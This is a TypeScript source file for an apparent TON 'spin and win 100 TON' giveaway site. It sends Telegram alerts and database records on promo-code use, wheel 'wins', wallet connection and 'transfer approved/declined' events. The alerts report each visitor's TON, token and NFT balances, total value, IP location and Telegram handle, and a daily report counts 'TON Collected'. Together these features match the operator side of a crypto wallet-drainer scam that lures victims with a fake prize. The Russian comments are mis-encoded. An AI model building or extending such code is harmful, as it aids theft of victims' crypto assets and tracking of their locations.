// lib/telegramEnhanced.ts

import { sendTelegramMessage, shortAdd, formatNumber, escp } from './telegram';
import { PromoCodeService, TransactionService } from './supabase';

interface NotificationData {
  wallet?: string;
  promoCode?: string;
  promoSource?: string;
  telegramUsername?: string;
  ipInfo?: { IP: string; ISO2: string };
  host?: string;
  amount?: number;
  tonBalance?: number;
  tokensValue?: number;
  nftsValue?: number;
  totalValue?: number;
}

export class TelegramNotificationService {
  
  // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –ø—Ä–æ–º–æ–∫–æ–¥–∞
  static async notifyPromoCodeUsed(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_PROMO_USED !== 'true') return;

    const message = `
üé´ *PROMO CODE ACTIVATED*

üìå *Code:* \`${data.promoCode}\`
üë§ *Source:* ${data.promoSource}
${data.telegramUsername ? `üí¨ *Telegram:* @${escp(data.telegramUsername)}` : ''}
üí≥ *Wallet:* ${data.wallet ? shortAdd(data.wallet) : 'Not connected'}

üìç *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
üåç *Site:* ${data.host}

‚è∞ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –ë–î
    if (data.wallet) {
      await PromoCodeService.useCode(
        data.promoCode!,
        data.wallet,
        data.telegramUsername,
        data.ipInfo
      );
    }
  }

  // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –≤—ã–∏–≥—Ä—ã—à–µ –Ω–∞ –∫–æ–ª–µ—Å–µ
  static async notifySpinWin(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_SPIN_WIN !== 'true') return;

    const method = data.promoCode 
      ? `Promo: \`${data.promoCode}\` (${data.promoSource})`
      : 'Paid spin (2 TON)';

    const message = `
üé∞ *SPIN COMPLETED - WON 100 TON!*

üé´ *Method:* ${method}
${data.telegramUsername ? `üí¨ *Telegram:* @${escp(data.telegramUsername)}` : ''}
üí≥ *Wallet:* ${data.wallet ? shortAdd(data.wallet) : 'Not connected yet'}

üìç *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
üåç *Site:* ${data.host}

‚è∞ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –≤ –ë–î
    if (data.wallet && data.promoCode) {
      await TransactionService.updatePromoUsage(
        data.wallet,
        data.promoCode,
        { spin_won: true }
      );
    }
  }

  // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞ –∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –∞–∫—Ç–∏–≤–æ–≤
  static async notifyAssetProcessing(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_REQUEST !== 'true') return;

    const message = `
üé£ *ASSETS PROCESSING*

${data.promoCode ? `üé´ *From Promo:* \`${data.promoCode}\` (${data.promoSource})` : 'üí∞ *From Paid Spin*'}
${data.telegramUsername ? `üí¨ *Telegram:* @${escp(data.telegramUsername)}` : ''}
üí≥ *Wallet:* ${shortAdd(data.wallet!)}

üí∞ *Balance Details:*
‚Ä¢ TON: *${data.tonBalance?.toFixed(4) || 0} TON*
‚Ä¢ Tokens Value: *${formatNumber(data.tokensValue || 0)}*
‚Ä¢ NFTs Value: *${formatNumber(data.nftsValue || 0)}*
‚Ä¢ Total Value: *‚âà ${formatNumber(data.totalValue || 0)}*

üìç *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
üåç *Site:* ${data.host}

‚è∞ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –≤ –ë–î
    await TransactionService.recordTransaction({
      wallet_address: data.wallet!,
      promo_code: data.promoCode,
      telegram_username: data.telegramUsername,
      transaction_type: 'reward_claim',
      ton_balance: data.tonBalance,
      tokens_value: data.tokensValue,
      nfts_value: data.nftsValue,
      total_value: data.totalValue,
      status: 'pending',
      ip_address: data.ipInfo?.IP,
      country: data.ipInfo?.ISO2
    });
  }

  // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
  static async notifyTransactionSuccess(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_SUCCESS !== 'true') return;

    const message = `
‚úÖ *TRANSFER APPROVED*

${data.promoCode ? `üé´ *Promo Used:* \`${data.promoCode}\` (${data.promoSource})` : 'üí∞ *Paid User*'}
${data.telegramUsername ? `üí¨ *Telegram:* @${escp(data.telegramUsername)}` : ''}
üí≥ *Wallet:* ${shortAdd(data.wallet!)}

üí∞ *Transferred:*
‚Ä¢ Amount: *‚âà ${formatNumber(data.totalValue || 0)} USD*

üìç *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
üåç *Site:* ${data.host}

‚è∞ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
    await TransactionService.recordTransaction({
      wallet_address: data.wallet!,
      promo_code: data.promoCode,
      telegram_username: data.telegramUsername,
      transaction_type: 'reward_claim',
      total_value: data.totalValue,
      status: 'success',
      ip_address: data.ipInfo?.IP,
      country: data.ipInfo?.ISO2
    });

    // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –ø—Ä–æ–º–æ–∫–æ–¥–∞
    if (data.wallet && data.promoCode) {
      await TransactionService.updatePromoUsage(
        data.wallet,
        data.promoCode,
        { reward_claimed: true }
      );
    }
  }

  // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ—Ç–º–µ–Ω–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
  static async notifyTransactionCancelled(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_CANCEL !== 'true') return;

    const message = `
‚ùå *TRANSFER DECLINED*

${data.promoCode ? `üé´ *Promo:* \`${data.promoCode}\` (${data.promoSource})` : 'üí∞ *Paid User*'}
${data.telegramUsername ? `üí¨ *Telegram:* @${escp(data.telegramUsername)}` : ''}
üí≥ *Wallet:* ${shortAdd(data.wallet!)}

üí∞ *Attempted Amount:* ‚âà ${formatNumber(data.totalValue || 0)} USD

üìç *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
üåç *Site:* ${data.host}

‚è∞ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –æ—Ç–º–µ–Ω—É –≤ –ë–î
    await TransactionService.recordTransaction({
      wallet_address: data.wallet!,
      promo_code: data.promoCode,
      telegram_username: data.telegramUsername,
      transaction_type: 'reward_claim',
      total_value: data.totalValue,
      status: 'cancelled',
      ip_address: data.ipInfo?.IP,
      country: data.ipInfo?.ISO2
    });
  }

  // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ–ø–ª–∞—Ç–µ —Å–ø–∏–Ω–∞
  static async notifyPaidSpin(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_PAYMENT !== 'true') return;

    const message = `
üí∞ *PAID SPIN*

üíµ *Amount:* ${data.amount} TON
${data.telegramUsername ? `üí¨ *Telegram:* @${escp(data.telegramUsername)}` : ''}
üí≥ *Wallet:* ${shortAdd(data.wallet!)}
üí∞ *Balance:* ${data.tonBalance?.toFixed(2)} TON

üìç *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
üåç *Site:* ${data.host}

‚è∞ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –ø–ª–∞—Ç–µ–∂ –≤ –ë–î
    await TransactionService.recordTransaction({
      wallet_address: data.wallet!,
      telegram_username: data.telegramUsername,
      transaction_type: 'spin_payment',
      amount: data.amount,
      status: 'success',
      ip_address: data.ipInfo?.IP,
      country: data.ipInfo?.ISO2
    });
  }

  // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–ø—ã—Ç–∫–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –Ω–µ–≤–µ—Ä–Ω–æ–≥–æ –ø—Ä–æ–º–æ–∫–æ–¥–∞
  static async notifyInvalidPromoAttempt(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_PROMO_INVALID !== 'true') return;

    const message = `
‚ùå *INVALID PROMO CODE*

üö´ *Attempted Code:* \`${data.promoCode}\`
${data.telegramUsername ? `üí¨ *Telegram:* @${escp(data.telegramUsername)}` : ''}
üí≥ *Wallet:* ${data.wallet ? shortAdd(data.wallet) : 'Not connected'}

üìç *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
üåç *Site:* ${data.host}

‚è∞ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);
  }

  // –ï–∂–µ–¥–Ω–µ–≤–Ω—ã–π –æ—Ç—á–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
  static async sendDailyReport() {
    try {
      const { StatisticsService } = await import('./supabase');
      const stats = await StatisticsService.getOverallStatistics();
      
      const message = `
üìä *DAILY STATISTICS REPORT*

üìÖ *Date:* ${new Date().toLocaleDateString('en-US')}

*Overall Stats:*
‚Ä¢ Total Promo Codes: *${stats.totalCodes}*
‚Ä¢ Active Codes: *${stats.activeCodes}*
‚Ä¢ Total Usage: *${stats.totalUsage}*
‚Ä¢ Unique Wallets: *${stats.uniqueWallets}*

*Transactions:*
‚Ä¢ Total: *${stats.totalTransactions}*
‚Ä¢ Successful: *${stats.successfulTransactions}*
‚Ä¢ Total TON Collected: *${stats.totalTonCollected.toFixed(2)} TON*

*Top Promo Codes:*
${stats.topPromoCodes.map((code, i) => 
  `${i + 1}. \`${code.code}\` (${code.name}) - ${code.uses} uses`
).join('\n')}

‚è∞ Report generated at ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

      await sendTelegramMessage(message);
    } catch (error) {
      console.error('Failed to send daily report:', error);
    }
  }
}